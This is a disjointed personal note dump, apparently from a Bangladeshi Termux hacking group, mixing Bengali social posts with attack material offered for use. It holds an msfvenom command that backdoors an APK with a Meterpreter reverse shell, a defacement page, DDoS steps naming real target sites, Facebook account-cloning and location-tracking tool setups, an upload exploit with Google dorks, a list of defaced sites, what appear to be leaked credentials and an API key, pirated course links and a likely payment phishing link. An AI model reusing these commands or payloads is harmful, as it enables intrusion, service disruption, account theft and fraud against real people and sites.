+______________________
+
+━━❖❖♥❖❖━━
+🆄🇲🅰​🆁
+━━❖❖♥❖❖━━
+
+\٩\L★╔═█🅡█═╗✥╔★╗✥╔═█🅘█═╗ ★║═█🅐█═║✥║☆║✥║═█🅜█═║ ★║═█🅣█═║✥║★║✥║═█🅤█═║ ★╚═█🅤█═╝✥╚☆╝✥╚═
+
+msfvenom -x /sdcard/ism.apk -p android/meterpreter/reverse_tcp LHOST=10.69.37.239 LPORT=4444 -f raw -o meter.apk
+
+
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<link href="https://fonts.googleapis.com/css?family=Iceland" rel='stylesheet' type='text/css'>
+		<link rel="icon" type="image/jpg" href="https://h.top4top.io/p_181280go40.jpg">
+		<title>Hacked By ./K4GUR4</title>
+		<meta property="og:title" content="Happy New Year"/>
+		<meta property="og:description" content="KYaa "/>
+		<link href="https://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet">
+	</head>
+	<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+	<body>
+		<center><br><br>
+			<body style="color: white ; margin:0;font: normal 14px/20px Share Tech Mono, Helvetica, sans-serif; height:100%; background-color: #000000;"/>
+				<div style="height:auto; min-height:100%; "><div style="text-align: center; white:800px; margin-left: -400px; position:absolute; top: 20%; left:50%;"></h1><br> <br>
+					<center><h2 style="margin-top:20px;font-size: 7;"><font color="#480ee6"><br><script type='text/javascript'>
+					//<![CDATA[
+					
+					/*
+					Teks berganti-ganti warna Script by xN5					Featured on JavaScript Kit, visit http://www.javascriptkit.com/script/script2/rainbowtext.shtml
+					*/
+					
+					var text="Hacked By ./K4GUR4"
+					var speed=/3/
+					
+					if (document.all||document.getElementById){
+					document.write('<span id="highlight">' + text + '</span>')
+					var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
+					}
+					else
+					document.write(text)
+					var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
+					var r=1
+					var g=1
+					var b=1
+					var seq=1
+					function changetext(){
+					rainbow="#"+hex[r]+hex[g]+hex[b]
+					storetext.style.color=rainbow
+					}
+					function change(){
+					if (seq==6){
+					b--
+					if (b==0)
+					seq=1
+					}
+					if (seq==5){
+					r++
+					if (r==12)
+					seq=6
+					}
+					if (seq==4){
+					g--
+					if (g==0)
+					seq=5
+					}
+					if (seq==3){
+					b++
+					if (b==12)
+					seq=4
+					}
+					if (seq==2){
+					r--
+					if (r==0)
+					seq=3
+					}
+					if (seq==1){
+					g++
+					if (g==12)
+					seq=2
+					}
+					changetext()
+					}
+					function starteffect(){
+					if (document.all||document.getElementById)
+					flash=setInterval("change()",speed)
+					}
+					starteffect()
+					
+					//]]>
+					</script> 
+					<br>
+			<br>
+			<hr color="red" width="25%"/>
+			<img src="https://www.gambaranimasi.org/data/media/562/animasi-bergerak-garis-0170.gif"><br>
+			<br>
+			<font color="pink"><script language="JavaScript" src="http://www.ipaddresslocation.org/my-ip-address.php" type="text/JavaScript">
+			</font></script><br><br>
+			 <br>
+		 <font size="8"<font color="red"<h1>HAPPY NEW YEAR 			 			<font color="pink"<h2>SELAMAT TAHUN BARU								</body>
+		<styletype="text/css">body { background-image:url(http://1.bp.blogspot.com/-6CsOJUHaxzU/UO7H1jfxWGI/AAAAAAAACHo/Wa2ajy8IgF0/s1600/storm.gif);background-color:transparent; }</style>
+
+
+<iframe width="0" height="0" src="https://b.top4top.io/m_1816wpesm0.mp3" frameborder="0" allowfullscreen></iframe>
+</html>
+
+10.69.37.239
+
+
+paragraph on “Animal Welfare”.	
+
+
+সবসময় মা এই হয়😭
+
+https://www.facebook.com/profile.php?id=100056291980058
+
+https://drive.google.com/drive/u/0/mobile/folders/153JzuNfRXj5itNiFJNcO1mU9L6vBcMIc
+
+
+dese: https://drive.google.com/drive/mobile/folders/1k_GdJtXMC-xyG-Rk-H0qEnqxZwX1R1p3
+
+.
+
+fiBDJICS
+
+
+https://i.ibb.co/qWn2wM0/GIF-201119-221506.gif
+
+
+Termux HelpLine BD [Hacking Course Giveaway]
+
+
+
+💌 Termux HelpLine BD এর পক্ষ থেকে অসংখ্য ধন্যবাদ আপনকে আমাদের গ্রুপে মেমবার ইনবাইট করার জন্য।
+
+
+Course Link: 
+
+Ethical Hacking
+
+
+https://drive.google.com/drive/folders/1aG5UhtCGMN20G-N_xPBqW2hdaqW6IFfv?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+
+Web Development Part-1
+
+
+https://drive.google.com/drive/folders/1kEHc3GtJZDtIdgilvEDXbzlynVjv60ok?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+Language : Bangla
+
+Size: 2000GB
+
+
+ ধন্যবাদ, 💓 আমাদের সাথেই থাকবেন😍
+
+
+[ সস তুলে,  লিংকটি মুছে, গ্রুপে রিভিউ দিতে ভুলবেন না]
+
+
+-Termux HelpLine BD Team 
+[Abm Mujahid]😍
+
+
+
+
+
+
+
+
+
+https://mbasic.facebook.com/comment/replies/?ctoken=591798178131105_593465657964357&actor_id=100028802598241&ft_ent_identifier=591798178131105&gfid=AQBlHZIL0eZfhkay6RY&refid=18&__tn__=R&fbt_id=591798178131105_593465657964357&lul&_rdr
+
+
+
+Abm, "Nothing happened to you"
+
+"You are perfectly fine mentally"
+
+"It doesn't matter, everything will be fine" "God can fix everything if He wills" 
+
+So, Control Abm
+
+
+apt update -y
+
+pkg install python python2 git -y
+
+git clone https://github.com/maldevel/IPGeoLocation
+
+cd IPGeoLocation
+
+pip install -r requirements.txt
+
+
+ok done Follow My Video😍
+
+
+ip : https://pastebin.com/88SzYenf
+
+
+
+
+
+
+
+
+https://graph.facebook.com/[id]/picture?width=800
+
+
+
+https://graph.facebook.com/100050206483656/picture?width=800
+
+
+
+
+graph.facebook.com/v2.0/100056154757750/picture?width=1080&height=1080 
+
+ 
+
+
+
+Termux & Linux:
+
+_______________________________
+
+★ DDos Method:1
+
+
+apt update -y
+
+apt upgrade -y
+
+
+pkg install python python2 -y
+
+
+pip2 install slowloris 
+
+
+slowloris https://www.cadastre.gouv.fr -s 300
+
+
+_________________________
+
+★ DDos Method:2
+
+
+apt update -y
+
+apt upgrade -y
+
+
+pkg install python python2 git -y
+
+
+git clone https://github.com/Ha3MrX/DDos-Attack 
+
+
+cd DDos-Attack
+
+
+python2 ddos-attack.py
+
+
+Terget Site IP: 145.242.11.58
+
+Port: 80
+
+_________________________________
+
+
+- Command Collected: Abm Mujahid
+
+
+
+
+
+
+145.242.11.58
+
+
+https://pastebin.com/wNzRFMxD
+
+
+
+
+
+
+
+.
+
+...
+
+
+https://mbasic.facebook.com/angel.mithila.5283/about?lst=
+
+100028802598241
+
+%3A
+
+ti100050206483656
+
+%3A1603769919&refid=17
+
+
+
+
+
+
+
+
+https://mbasic.facebook.com/abm.mujahid.31/about?lst=100028802598241%3A100056154757750%3A1603772463&refid=17
+
+
+
+
+foysal: https://drive.google.com/drive/u/0/mobile/folders/153JzuNfRXj5itNiFJNcO1mU9L6vBcMIc
+
+
+English : https://drive.google.com/drive/mobile/folders/0B6nrT4KlzA4rVXhET3dTUEpFaGM
+
+
+python: https://drive.google.com/drive/
+
+
+4k hd wallpaper: https://drive.google.com/drive/u/0/mobile/folders/0Bx2Vez2N3qd7SGxkejRhQmdKQlk
+
+
+uday:: https://drive.google.com/drive/u/0/mobile/folders/0B1HQDi7EkA9XNlR3STF5SVJIVUk
+
+
+COMPLETE PYTHON BOOTCAMP: GO FROM ZERO TO HERO IN PYTHON 3
+
+
+https://drive.google.com/file/d/19ku0YGH7_FCJxU9oEDzgD6xDk1gDJYou/view
+
+
+￼ETHICAL HACKING PRACTICAL VIDEOS
+
+
+https://drive.google.com/open?id=0BxgVsNcdME07X2ExOFVTWVpUWGc
+
+
+￼CERTIFIED ETHICAL HACKING
+
+
+https://drive.google.com/drive/folders/0B6TUap6XJ89LbnVzSnpIWHB4QWM
+
+
+
+
+
+
+Learn Hacking Using Android From Scratchhttps://drive.google.com/drive/folders/1EsVmWyw5OCMag6bkTY7v_2w2xT590n7W
+
+
+Hacking bookshttps://drive.google.com/drive/mobile/folders/0B5rqWHARHFcVNUpNamdoMlRqRm8
+
+
+Network Securityhttps://drive.google.com/drive/folders/0B9h6Z88xmpyKWGZyZk1hSzVfOWs?sort=13&direction=a
+
+
+Pythonhttps://drive.google.com/drive/folders/0B-naBPVFnJB-TDJ4NFFrQWdpLW8
+
+
+Learn Python & Ethical Hacking From Scratch - 12.1 GB Udemyhttps://drive.google.com/open?id=1JaGBX2Jmi48griwRCR8HKBTcznYnF4T1
+
+
+The Complete Python Course - Learn Python by Doing - Udemyhttps://drive.google.com/open?id=1SOve7HN6M3xzvnBC6l87EcogkJHgXTFk
+
+
+Django 2 & Python - The Ultimate Web Development Bootcamp - Udemyhttps://drive.google.com/open?id=1E73DxFufDW794eTVcRRRHRBRTALzirwu
+
+
+Wifi Hacking Penetration Testing From Scratchhttps://drive.google.com/drive/u/0/mobile/folders/1rfUC1VMEKky2vBFoC6qTPhtyptL7fNq9
+
+
+Cyber Security Bundlehttps://drive.google.com/drive/folders/1DKOSjOY_P1JCXDi0XxVTHkOWl4yNj1GL?usp=sharing
+
+
+Dedsec Advance Wifi Hacking Coursehttps://drive.google.com/drive/mobile/folders/19Y8K1UhOqHyQrO0ED3Z5nPbKWQd1oaD9
+
+
+Hacking Exploithttps://drive.google.com/drive/folders/0BzmvOhnl9n9HMFFvVDJ5TGNyQzQ
+
+
+CEHv9 Ethical Hacking Training Ec-Councilhttps://drive.google.com/folderview?id=0B3yiSJK5LEsHWktGN2VXR0F3Wlk
+
+
+Learn Ethical Hacking Advance Level Using Kali Linuxhttps://drive.google.com/drive/folders/1NFG4Li5Q7uulp7Hpn8t3ZkWvviGVg-fJ
+
+
+Ethical Hacking From Scratch To advancedhttps://drive.google.com/uc?id=0B9imUSbsU3YlOV9PTk1zaDVkWEU&export=download
+
+
+Ethical Hacking Course. Language Hindihttps://drive.google.com/drive/mobile/folders/1MBKOClZ--Ovc9Rp9VtkpzJI6xgzTQslC
+
+
+1 TB Udemy Courseshttps://drive.google.com/drive/mobile/folders/0Bwci1XJP8s_VZGN6OUdfTEozSmM?usp=sharing
+
+
+All Udemy And Programming Courseshttps://drive.google.com/folderview?id=1rkGmGcnkwXZRRcNWaHo2DiNRPFNVluHB
+
+
+Seo Course
+
+https://drive.google.com/open?id=0B6Ygk-lvceUWblZhMjIxZkZBY00
+
+
+Complete Android Coursehttps://drive.google.com/file/d/1IAI-LulEeXA2jFAsH4sq5t4WM1S8dsnn/view
+
+
+Html Full Coursehttps://drive.google.com/folderview?id=0B3LfaGUUk6tiT18xZDRBY1FCVXc
+
+
+Cloud Based Courses Collection Become A Cloud Experthttps://drive.google.com/drive/u/0/mobile/folders/1IFDoxZAl7k8PfJSblyw2X2D1MN1QzwtS/1vhzBtdhAtmLQfhpL6Wsyt8_2IJw3mslF?sort=13&direction=a
+
+
+Udacity - Software Engineering [All 23 Courses]https://drive.google.com/drive/mobile/folders/1Zw82azj7ELOBC-uJrStxwgwdh8uRWY54
+
+
+Udemy - PHP for Beginners How to Build an E-Commerce Store
+
+https://drive.google.com/drive/folders/1WRfuZJeJq72tJmVrVhmfEk-yv8-K_WtS
+
+
+Building Apps with Angular and Breeze First Editionhttps://drive.google.com/open?id=1UkZPvXh7NenLtLOjFycNJtvxUuC5CQ4O
+
+
+Learning Angular LiveLessons Covering Angular 2 and Angular 4, Second Editionhttps://drive.google.com/open?id=1Y6nUHaL9wYObU07Zkd5BzJVOcSadLN3Z
+
+
+Pluralsight - Angular Security Using JSON Web Tokens
+https://drive.google.com/open?id=1zkAwZ9dDeT4Z77A0fZWV9bPXYa5ASGCB
+
+
+Pluralsight - Code School Accelerating Through Angularhttps://drive.google.com/drive/folders/1SjjVavSTwmImKGefLwPZSC0yhKB0f4gU?usp=sharing
+
+
+Udemy - Angular - Concepts, Code and Collective Wisdomhttps://drive.google.com/open?id=13y-2icK6oC59BEnbJFZvPhx8xpvk17Mw
+
+
+Udemy - Angular 6 (formerly Angular 2) - The Complete Guide
+https://drive.google.com/drive/folders/1dxV3F_tPDEKuYtlUFITT-rnSp70dT43u
+
+
+Udemy.C.programming.step.by.step.from.beginners.to.advance.level
+https://drive.google.com/drive/folders/1pSjRyt9MJmRhQI9_4SFqHxlC6zqrBs5P
+
+
+Java Programming - Complete Tutorial
+https://drive.google.com/drive/u/0/mobile/folders/1IFDoxZAl7k8PfJSblyw2X2D1MN1QzwtS/1K3EIe2kfBEUgCP3cTJA6le3LH8sg-_EV?sort=13&direction=a
+
+
+Deep learning Manning books
+https://drive.google.com/drive/folders/1yXZ1HgyQ7yPUJI8cC7ZnTWi0BAbxq_Kg?usp=sharing
+
+
+Wireshark Paid Course
+
+https://drive.google.com/folderview?id=12CZulploMfkYGTIhyFixoixjmthjw0AV
+
+
+Linux Academy Learning Vagran
+https://drive.google.com/open?id=1kd55W8j-8tPOG5eSqDsItcE5IL5YCUHF
+
+
+
+
+৩৬ দেশের আইডি ক্লোনিং কমান্ড -🔥
+
+
+$ pkg install python
+
+
+$ pkg install python2
+
+
+$ pkg install git
+
+
+$ git clone https://github.com/NUR-404/clone
+
+
+$ cd clone
+
+
+$ python2 36-clone.py
+
+
+মাঝের ইমুজি রিমুভ করে দিবেন
+
+
+
+arajon661@gmail.com golamnobi2300
+
+
+কি করে বোঝাই এই মা কে,
+
+উনার ছেলে যে অপরাধ করেছে,  তাকে কখনই ক্ষমা করা যাবে না।
+
+
+cyber71 : https://drive.google.com/drive/u/0/mobile/folders/1--ZD_j8sOZdPnvqXbmPD2DYfSLSVKdgn?usp=sharing
+
+
+কিন্তু সন্তান হাজার টা অপরাধ করলেও অপরাধীর মায়ের কোমল হৃদয়টা কখনই মানবে না, কখনই বিশ্বাস করবে না তার সন্তান অপরাধী 🙂।
+
+
+হাজারটি অপরাধ করলেও, যদি অপরাধী সন্তানের শাস্তি হয়, তারপরও মা কান্না করে দুহাত উপরে তুলে আল্লাহর দোয়া করবে যেন তার সন্তানকে তার কোলে ফিরিয়ে দেওয়া হয়🙂
+
+
+আরে রেপিস্ট,, এটাই হলো মা জাতি🙂 যাদেরকে তরা রেপকরতেছিস।🤬😡 দেখ তরা,,, মা জাতির ভালোবাসা। মা জাতির পেট থেকে জন্ম নিয়ে আবার তাদেরকেই রেপ করতেছিস,,,। আরে তদের যদি ফাঁসিও দেওয়া হয় তাহলেও সেটি কম হবে😭
+
+--------------------------------
+
+
+★ মা জাতিটা কখনো চোরের বা অপরাধীর হয় না বরং মা জাতির আঁচল থেকে মুক্ত হয়ে যাওয়া সন্তানটিই রেপিস্ট, চোর, অপরাধী হয়ে যায়🙂
+
+ সো মা-কে ছোট করে এভাবে উপস্থাপন না করলেও পারতাম🙂
+
+
+
+
+
+ধর্ষণের সর্বোচ্ছ শাস্তি মৃত্যুদন্ড দিলেই কি ধর্ষণ বন্ধ হয়ে যাবে?
+
+কিন্তু মানুষ হত্যার শাস্তিও তো মৃত্যুূদন্ড তবে কি মানুষ হত্যা বন্ধ হয়ে গেসে? দেশে?
+
+
+ধর্ষণ বন্ধ তখনিই সম্ভব হবে যখন আমাদের মন মানসিকতা পরিবর্তন হবে।
+
+
+আর আমাদের মন মানসতা পরিবর্তন করতে হলে, কুরআনের বিদান অনুযায়ী রাষ্ট্র পরিচালনা করতে হবে।
+
+
+অর্থাৎ, 
+
+★ মেয়েদের পর্দা করা বাধ্যতামূলক করতে হবে।
+
+★ ছেলে মেয়ে মেলামেশা বন্ধ করতে হবে।
+
+★ প্রেম  নিসিদ্ধ  করতে হবে।
+
+★ অশ্লীল সিনেমা, মিউজিক ভিডিও,  নাটক, অর্থাৎ যেগুলোর মধ্যেদিয়ে বিনোদনের নামে যৌনশুশশুরানি  দেয়া হয়,  এগুলো নিসিদ্ধ ঘোষণা করতে হবে।
+
+
+♦যদিও এগুলো কখনই সম্ভব না, তাই প্রতিটা বোনদের নিজ দায়িত্বে পর্দা করতে হবে আর ধর্ষণের যেনো সর্বোচ্ছ শাস্তি হয় তা নিয়ে আন্দোলন করতে হবে। তখনিই ধর্ষণ রোধ সম্ভব হবে🙂
+
+
+★ "কেন পর্দা করবো? কেন ঘরে বন্দি হয়ে থাকবো? আমাদের তো একটা স্বাধীনতা বলতে কিছু আছে নাকি? ছেলে মেয়ে সমান অধিকার" যারা এগুলো বলবে,  ঠিক আছে সমান অধিকারেই!  তো ধর্ষণ হলে তোমাদের সমস্যা কোথায়? ছেলেদের তো কোনো সমস্যা নেই ধর্ষণে।🙃 
+
+
+
+![আপনারা হয়তো এখন এই যৌক্তি দিবেন,"যদি এগুলোই ধর্ষণের কারণ হয় তাহলে ৭০ বছরের বৃদ্ধা কেন ধর্ষণ হয়?" এটা আমি নিচে বিশ্লেষণ করতেছি। 
+
+
+
+
+
+
+This vedios is for only Educational purpose
+
+In this vedio i will show you how to use seeker took in termux,dont for get to 
+
+Subscribe
+
+Like
+
+Share
+
+Commands:-
+
+apt update
+
+apt upgrade
+
+pkg install php
+
+pkg install wget
+
+pkg install git
+
+git clone https://github.com/thewhiteh4t/seeker...
+
+ls
+
+cd seeker
+
+ls
+
+chmod 777 termux_install.sh
+
+python3 seeker.py -t manual
+
+
+Requirments for seeker
+
+Termux
+
+Ngrok
+
+
+Topics covered:-
+
+How to install seekerhi
+
+How to install seeker took
+
+How to use seeker tool
+
+Exact location
+
+ngrok
+
+termux
+
+know someone location
+
+trace ip
+
+
+#seeker#termux#tech rhonny#exact location#use seeker
+
+
+
+
+
+
+
+hello friends my name is Vishal kumar ...
+
+
+Dork:-   inurl:index.php?option=com_fabrik
+
+
+exploit:-   /index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload  
+
+
+You can download a csrf file from anywherecu
+
+
+dork:inurl:/upload/test.html
+
+dork:
+
+inurl /fckeditor/editor/filemanager/upload/test.html
+
+
+anguman gov.
+
+
+
+https://www.facebook.com/groups/733923543855978/permalink/734250073823325/?app=fbl
+
+
+
+
+https://mbasic.facebook.com/comment/replies/?ctoken=591798178131105 _593465657964357&actor_id=100028802598241&ft_ent_identifier=591798178131105&gfid=AQClJTySKCMzPtd_pE4&refid=18&__tn__=R#comment_form_ 100039197140896 _591798178131105_reply_593465657964357
+
+
+NBme
+
+
+Ethical Hacking
+
+
+https://drive.google.com/drive/folders/1aG5UhtCGMN20G-N_xPBqW2hdaqW6IFfv?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+
+Web Development Part-1
+
+
+https://drive.google.com/drive/folders/1kEHc3GtJZDtIdgilvEDXbzlynVjv60ok?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+
+
+১৪টা বাংলা Paid Couse ফ্রিতে দিলাম কারো লাগলে সংগ্রহ করে রাখতে পারেন।
+
+
+Ethical Hacking
+
+
+https://drive.google.com/drive/folders/1aG5UhtCGMN20G-N_xPBqW2hdaqW6IFfv?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+
+Full Microsoft Excel
+
+
+https://drive.google.com/drive/folders/1-g11Q2elvu8TsQni2psg0O01dE0Ae8Jx?fbclid=IwAR1TIGGGv80324LHM1_t6uS8PMHSuR5Atgq33PVWlCociF4M-yPlBggPzyk
+
+
+Full ASP.Net Course
+
+
+https://drive.google.com/drive/folders/1qlYHB5N2n9SLEv6sRvUskgUQ7BDLtQp1?fbclid=IwAR14l6AiNLqfAiYons3Ce0TYwsRT36PTJUbrrtAb4WPv3rrRBvJBUMU7BcY
+
+
+Complete SEO Course
+
+
+https://drive.google.com/drive/u/2/folders/1BiUimpLkuwMjHwHBS_kymTKROhlpTVdC?fbclid=IwAR2LFVcwgXlJg9sewWqnlParY_EheP5kPWsXKflj8ofK_qvKZALSQMAOPH4
+
+
+Web Development Part-1
+
+
+https://drive.google.com/drive/folders/1kEHc3GtJZDtIdgilvEDXbzlynVjv60ok?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+
+Web Development Part-2
+
+
+https://drive.google.com/drive/folders/1kboeMjeXboQfNo7rqH9Kacx3hqMM8vj8?fbclid=IwAR14l6AiNLqfAiYons3Ce0TYwsRT36PTJUbrrtAb4WPv3rrRBvJBUMU7BcY
+
+
+Complete Java Course
+
+
+https://drive.google.com/drive/folders/1S_axgPA7DPrR7xWiqSI2RZpX7M-IZcjU?fbclid=IwAR3rU6JyKkEdtj_jF8qwyIhhS9t78Bb6Sls0sX9Y914QAz0TG4mR-R-ax3g
+
+
+Graphics Design
+
+
+https://drive.google.com/drive/folders/1w8vHj7oWHpkh2UUAW59kpEG7E2wGD5aD?fbclid=IwAR0krxTzKuzGbn7N-feuL0qpzj_AA9mMuDUfeScXoaRBbMLRGdGMAMaCQnw
+
+
+Spoken English
+
+
+https://drive.google.com/drive/folders/11vSIZz3PhDeMsUqvfPTx6j_hGemSv4fx?fbclid=IwAR2CBFULG77XSx4X7hjotNCizDYpB6SVMxYnaVS9c59XLm4fj-Yx8kZRGyw
+
+
+Android App Development
+
+
+https://drive.google.com/drive/folders/15DZTb3kraSVCRRQnk3duOz1sPPcrK0Ti?fbclid=IwAR2driJCbqocy8fIgJhO7OVBhudjZ8BmtaWHSU0Vqxl15nzb-3-wfwlOeWs
+
+
+Digital Marketing Full Course
+
+
+https://drive.google.com/drive/folders/13wJSQ2GC-MZwcAmNYhCRFSrOsPRdsZnu?fbclid=IwAR3qW4A2QMOio05TCDfYfczNO6XWpp4c9UxjEnez4-uJ-ZphKvHzRvPDr_k
+
+
+CPA MARKETING
+
+
+https://drive.google.com/drive/folders/1AAIwLS85aecMhgLIIO1M8f8uhKPFlfU6
+
+
+YouTube Marketing
+
+
+https://drive.google.com/drive/folders/1o3Brg6hMsVGVwHnD6waYDUpJIAPInNwN
+
+
+Facebook Marketing
+
+
+https://drive.google.com/drive/folders/1m-V8pHb3HUACY1Aca2PmFfBembCvjDiK
+
+
+#collected
+
+
+See Translation
+
+
+Ethical Hacking
+
+
+https://drive.google.com/drive/folders/1aG5UhtCGMN20G-N_xPBqW2hdaqW6IFfv?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+
+Full Microsoft Excel
+
+
+https://drive.google.com/drive/folders/1-g11Q2elvu8TsQni2psg0O01dE0Ae8Jx?fbclid=IwAR1TIGGGv80324LHM1_t6uS8PMHSuR5Atgq33PVWlCociF4M-yPlBggPzyk
+
+
+Full ASP.Net Course
+
+
+https://drive.google.com/drive/folders/1qlYHB5N2n9SLEv6sRvUskgUQ7BDLtQp1?fbclid=IwAR14l6AiNLqfAiYons3Ce0TYwsRT36PTJUbrrtAb4WPv3rrRBvJBUMU7BcY
+
+
+Complete SEO Course
+
+
+https://drive.google.com/drive/u/2/folders/1BiUimpLkuwMjHwHBS_kymTKROhlpTVdC?fbclid=IwAR2LFVcwgXlJg9sewWqnlParY_EheP5kPWsXKflj8ofK_qvKZALSQMAOPH4
+
+
+Web Development Part-1
+
+
+https://drive.google.com/drive/folders/1kEHc3GtJZDtIdgilvEDXbzlynVjv60ok?fbclid=IwAR2OKCLhggSDXVEkZiwVy-zVChJfnZVjK7nHW_1wytm1zbDIAXyORE49NUk
+
+
+Web Development Part-2
+
+
+https://drive.google.com/drive/folders/1kboeMjeXboQfNo7rqH9Kacx3hqMM8vj8?fbclid=IwAR14l6AiNLqfAiYons3Ce0TYwsRT36PTJUbrrtAb4WPv3rrRBvJBUMU7BcY
+
+
+Complete Java Course
+
+
+https://drive.google.com/drive/folders/1S_axgPA7DPrR7xWiqSI2RZpX7M-IZcjU?fbclid=IwAR3rU6JyKkEdtj_jF8qwyIhhS9t78Bb6Sls0sX9Y914QAz0TG4mR-R-ax3g
+
+
+Graphics Design
+
+
+https://drive.google.com/drive/folders/1w8vHj7oWHpkh2UUAW59kpEG7E2wGD5aD?fbclid=IwAR0krxTzKuzGbn7N-feuL0qpzj_AA9mMuDUfeScXoaRBbMLRGdGMAMaCQnw
+
+
+Spoken English
+
+
+https://drive.google.com/drive/folders/11vSIZz3PhDeMsUqvfPTx6j_hGemSv4fx?fbclid=IwAR2CBFULG77XSx4X7hjotNCizDYpB6SVMxYnaVS9c59XLm4fj-Yx8kZRGyw
+
+
+Android App Development
+
+
+https://drive.google.com/drive/folders/15DZTb3kraSVCRRQnk3duOz1sPPcrK0Ti?fbclid=IwAR2driJCbqocy8fIgJhO7OVBhudjZ8BmtaWHSU0Vqxl15nzb-3-wfwlOeWs
+
+
+Digital Marketing Full Course
+
+
+https://drive.google.com/drive/folders/13wJSQ2GC-MZwcAmNYhCRFSrOsPRdsZnu?fbclid=IwAR3qW4A2QMOio05TCDfYfczNO6XWpp4c9UxjEnez4-uJ-ZphKvHzRvPDr_k
+
+
+CPA MARKETING
+
+
+https://drive.google.com/drive/folders/1AAIwLS85aecMhgLIIO1M8f8uhKPFlfU6
+
+
+YouTube Marketing
+
+
+https://drive.google.com/drive/folders/1o3Brg6hMsVGVwHnD6waYDUpJIAPInNwN
+
+
+Facebook Marketing
+
+
+https://drive.google.com/drive/folders/1m-V8pHb3HUACY1Aca2PmFfBembCvjDiK
+
+
+http://sh-meet.bigpixel.cn/?from=groupmessage&isappinstalled=0
+
+
+
+Website IP, Port find :https://youtu.be/yp60sJd03FU
+
+__________________________________________
+
+ ⤵⤵⤵⤵⤵⤵⤵⤵⤵⤵⤵    
+
+🔨Tool Install Link: https://pastebin.com/BhtWmr1E
+
+
+
+
+
+
+
+https://github.com/noob-hackers/lazybee
+ESSID :  Mukul_mh
+https://github.com/sachin175638/jdash
+
+https://pastebin.com/QFB17ZWY
+
+Invisible symbol ( ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎)
+AIzaSyCrsUwLesc0QFNoklHBww-XHlWYZJCz_Tw
+
+
+r40
+
+git clone https://github.com/adi1090x/termux-style
+
+
+
+
+l
+
+
+
+
+
+
+
+https://www.apnsettings.org/bangladesh/mcc-and-mnc-for-bangladesh/
+
+
+https://cellphonetrackers.org/gsm/gsm-tracker.php
+
+
+
+470-1-21107-32592
+
+
+
+
+
+
+
+
+
+470-1-1025-17292
+
+
+
+
+
+
+SQL 1:https://youtu.be/YxBM2C2K6IE
+SQL 2:https://youtu.be/R851foLh4rs
+SQL 3:https://youtu.be/8W-a5_b-fqM
+SQL 4:https://youtu.be/awRYcbIxlRg
+
+
+http://nhsgilde.co.za/greyhat.html
+http://gearboxpros.co.za/greyhat.html
+http://gearboxpros.co.za/greyhat.html 
+http://happy.mikikk.co.jp/greyhat.html
+http://foodconsult.co.za/greyhat.html
+http://crimsonmonkeyweb.com/greyhat.html
+http://chillibitez.co.za/greyhat.html
+http://allpaint.co.za/greyhat.html
+
+
+
+
+
+
+
+
+
+
+
+https://l.facebook.com/l.php?u=https%3A%2F%2Fbkash-1000tk-ab.blogspot.com%2Fp%2Fblog-page.html&h=AT1hODkwuQRIfiQWoNXVaTCtW2BMAnAluxbAn9mwJkOFlPtyq13ygr-Y3K8_WEEYtW1ewGpkr5jfbYPsUCHkRjzyEZc7dki4bX4kS3jI30OHT5YP3zEzdV-SG8ZsxjpN6px51JWSWQ
+
+
+link lagle inbox korte paren😊
+
+
+
+
+
+
+....  57 ta website hack korlam...
+
+[ Bangladesh er kono website na]😊
+
+
+
+
+
+
